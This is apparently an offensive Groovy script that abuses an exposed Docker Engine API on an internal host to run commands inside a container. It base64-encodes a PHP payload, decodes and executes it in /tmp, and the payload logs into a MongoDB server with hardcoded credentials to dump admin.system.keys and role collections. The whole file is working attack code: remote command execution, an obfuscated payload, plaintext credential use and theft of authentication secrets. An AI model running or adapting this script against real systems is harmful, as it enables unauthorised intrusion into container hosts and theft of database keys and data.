import groovy.json.JsonSlurper
import groovy.json.JsonOutput

def dHost = "172.27.140.148"
def dPort = 4243
def cid = "5b32e909c295"

def phpCode = '''<?php
error_reporting(E_ALL & ~E_DEPRECATED & ~E_WARNING);
$m = new MongoDB\\Driver\\Manager("mongodb://appsears:S34rSu64RD0Jhy63@172.26.84.132:27021/sears_tracking?connectTimeoutMS=8000&serverSelectionTimeoutMS=10000");
foreach ([['admin','system.keys'],['admin','system.roles'],['admin','system.version']] as $c) {
    echo "DUMP|{$c[0]}.{$c[1]}\\n";
    try {
        $q = new MongoDB\\Driver\\Query([], ['limit'=>50]);
        $cur = $m->executeQuery("{$c[0]}.{$c[1]}", $q);
        $cur->setTypeMap(['root'=>'array','document'=>'array','array'=>'array']);
        foreach ($cur as $doc) {
            echo json_encode($doc, JSON_UNESCAPED_SLASHES) . "\\n";
        }
    } catch (Exception $e) { echo "ERR: " . substr($e->getMessage(),0,150) . "\\n"; }
}
echo "ALLDONE\\n";
?>'''

def b64 = java.util.Base64.encoder.encodeToString(phpCode.getBytes("UTF-8"))
def url = new URL("http://${dHost}:${dPort}/containers/${cid}/exec")
def conn = url.openConnection()
conn.setRequestMethod("POST"); conn.setDoOutput(true)
conn.setRequestProperty("Content-Type", "application/json")
def shCmd = 'echo ' + b64 + ' | base64 -d > /tmp/m8.php && php /tmp/m8.php'
def body = JsonOutput.toJson([AttachStdout:true, AttachStderr:true, Cmd:["bash","-c",shCmd]])
conn.outputStream.write(body.bytes); conn.outputStream.flush()
def r = new JsonSlurper().parseText(conn.inputStream.text)
def eid = r.Id
def su = new URL("http://${dHost}:${dPort}/exec/${eid}/start").openConnection()
su.setRequestMethod("POST"); su.setDoOutput(true)
su.setRequestProperty("Content-Type", "application/json")
su.outputStream.write('{"Detach":false,"Tty":true}'.bytes); su.outputStream.flush()
println su.inputStream.text
